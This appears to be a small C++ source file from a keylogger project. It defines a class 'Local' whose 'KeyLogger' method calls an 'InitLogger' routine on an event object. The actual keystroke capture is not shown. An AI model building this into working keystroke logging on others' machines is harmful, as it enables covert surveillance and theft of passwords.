//
// Created by Nagamo_s on 03/10/2017.
//

#include "Local.hpp"

Local::Local()
{
    event = new GetEvent();
}

Local::~Local()
{
}

void Local::KeyLogger()
{
    event->InitLogger();
}